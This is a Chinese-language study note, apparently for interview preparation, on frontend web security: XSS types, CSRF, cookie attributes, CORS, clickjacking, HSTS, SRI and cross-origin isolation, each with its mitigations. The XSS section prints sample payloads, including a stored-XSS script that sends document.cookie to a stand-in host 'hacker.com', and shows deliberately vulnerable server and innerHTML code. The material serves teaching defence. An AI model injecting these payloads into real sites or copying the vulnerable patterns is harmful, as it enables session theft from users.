# XSS: 跨站脚本攻击

一、永远的 Top1：XSS（跨站脚本攻击）。

核心原理是攻击者将恶意脚本注入到网页中并在用户浏览器上执行，常用于窃取 Cookie、监听用户行为、伪造请求。常考分类有三种：

1）反射型（非持久型），恶意==代码在 URL 参数==中，服务端拼接后直接返回给==浏览器执行==；

```js
<!-- 用户点击了这个恶意链接 -->
<!-- https://example.com/search?q=<script>alert(document.cookie)</script> -->

<!-- 服务端代码（Node.js 为例） -->
app.get('/search', (req, res) => {
  const q = req.query.q; // 拿到 URL 参数：<script>alert(document.cookie)</script>
  res.send(`<h1>搜索结果：${q}</h1>`); // 直接拼进 HTML 返回
  // 浏览器收到后，<script> 被当成真代码执行了
  // 用户 cookie 就被弹出来了（实际攻击会发送到攻击者服务器）
});
```

2）存储型（持久型），恶意==代码被保存到数据库==，其他用户访问页面时==数据被下发时浏览器执行==，危害最大；

```js
<!-- 攻击者在评论框输入 -->
<script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>

<!-- 服务端把这条评论原样存进数据库 -->
<!-- 其他用户访问这个页面时，服务端从数据库取出评论，拼进 HTML -->

<div class="comment">
  <script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>
  <!-- 每个看到这条评论的用户，浏览器都会执行这段脚本 -->
  <!-- 所有人的 cookie 都被偷走了 -->
</div>
```

3）DOM型，完全在前端发生，JS 读取 URL 或输入后通过 `innerHTML` 等危险 API 直接渲染。

```js
<!-- 恶意链接：https://example.com/page#<img src=x onerror=alert(document.cookie)> -->

<div id="output"></div>

<script>
  const hash = location.hash.substring(1); // 读取 # 后面的内容
  document.getElementById('output').innerHTML = hash; 
  // 直接用 innerHTML 渲染了用户输入
  // <img src=x onerror=alert(document.cookie)> 被插入 DOM
  // 图片加载失败，触发 onerror，执行了恶意代码
  // 全程没经过服务端，纯前端发生
</script>
```

### XSS 解决方案

核心两条：==1. 转义/过滤用户输入，2. 限制浏览器执行不可信代码。==

| 手段 | 做法 | 防什么 |
| --- | --- | --- |
| 框架自动转义 | React/Vue 默认转义插值，别用 dangerouslySetInnerHTML / v-html | 输出被当代码执行 |
| 输入过滤 + 输出转义 | 服务端过滤特殊字符；输出用 innerText 不用 innerHTML | `<` `>` script 注入 |
| HttpOnly Cookie | Cookie 加 HttpOnly，JS 读不到 | XSS 成功后偷 cookie |
| CSP | 白名单限制脚本来源，非白名单不执行 | 注入脚本被执行（兜底） |
| 避免危险 API | 不把不可信数据拼进 eval/setTimeout/location.href | 间接代码执行 |

==CSP（面试爱考）：响应头 `Content-Security-Policy` 声明允许加载哪些来源的脚本/样式，非白名单不执行。严格 CSP 用 Nonce(一次性随机数) 或 Hash 校验，只有匹配的脚本才执行。==

==一句话：框架转义 + 输入输出过滤是主力，HttpOnly 保底，CSP 兜底。==


二、CSRF（跨站请求伪造）

### 是什么

==CSRF：攻击者诱导受害者访问恶意网站，浏览器自动带上已登录的 cookie，向目标网站发伪造请求（改密/转账）。借身份骗服务端，本身不偷数据。==

==和 XSS 的区别：XSS 是注入代码偷数据，CSRF 是借 cookie 伪造请求。==

### 怎么解决

| 手段 | 做法 | 为什么有效 |
| --- | --- | --- |
| SameSite Cookie | 设 Lax/Strict，跨站请求不带 cookie | 伪造请求没 cookie，身份不成立（银弹） |
| 校验 Origin/Referer | 服务端判断请求来源域名 | 拦截来自恶意站点的请求 |
| Anti-CSRF Token | 服务端发随机 token，请求携带校验 | 跨站拿不到 token |


三、Cookie 安全三大属性（防 XSS / CSRF 的基石）

| 属性 | 作用 | 防什么 |
| --- | --- | --- |
| HttpOnly | JS 读不到 cookie | XSS 偷 cookie |
| Secure | 只走 HTTPS 传输 | 中间人窃听 |
| SameSite | Strict/Lax 跨站不带 cookie | CSRF |

==前沿：第三方 cookie 被淘汰趋势下，大厂改用 Partitioned Cookie (CHIPS 分区机制) 做跨站登录/埋点。==


四、CORS 与同源策略

> 完整机制见 [[🔖 网络相关 http nginx]]（同源 / CORS 响应头 / 预检 / 代理）。安全视角只记一条：`Access-Control-Allow-Origin: *` 不能和 `Access-Control-Allow-Credentials: true` 同开（也不能动态回显 Origin），否则任意站点都能带凭证读响应。


五、点击劫持 (Clickjacking)

- 透明 iframe 盖在诱导按钮上，用户以为点"中奖"，实际点到 iframe 里的转账/关注
- 防：响应头 `X-Frame-Options: DENY/SAMEORIGIN`，或 CSP 的 `frame-ancestors`


六、target="_blank" 与 opener 漏洞

- 新窗口能用 `window.opener.location` 把原页重定向到钓鱼站
- 防：`rel="noopener noreferrer"` 切断两窗口联系
- 窗口间关系/通信机制（postMessage 等）见 [[跨端 跨页面通讯]]


七、HTTPS / MITM / HSTS

> TLS 握手/证书/加密的完整机制见 [[🔖 网络相关 http nginx]]，这里只记攻击与防御视角：
- 中间人（MITM）：HTTP 明文 → 易窃听/篡改；HTTPS 用 TLS 防，但首次访问仍可能被降级劫持
- 防首次降级：`HSTS` 头让浏览器本地强制升 https，之后不再走 http


八、SRI 与供应链安全

- CDN 被黑、JS 被篡改 → `<script integrity="sha384-xxx">` 校验 hash，不一致拒绝执行
- npm 投毒：用 `npm audit` / 内部扫描


九、Fetch Metadata（前沿）

- 请求头带 `Sec-Fetch-Site/Mode/Dest`，服务端按真实来源在网关/WAF 层拦截


十、跨源隔离 (Cross-Origin Isolation)

- 防 Spectre 侧信道（CPU 预测执行偷内存）
- 需配 `COOP`（隔离弹窗）+ `COEP`（嵌入资源须声明跨源）
- 配好才能用 `SharedArrayBuffer` / 高精度计时
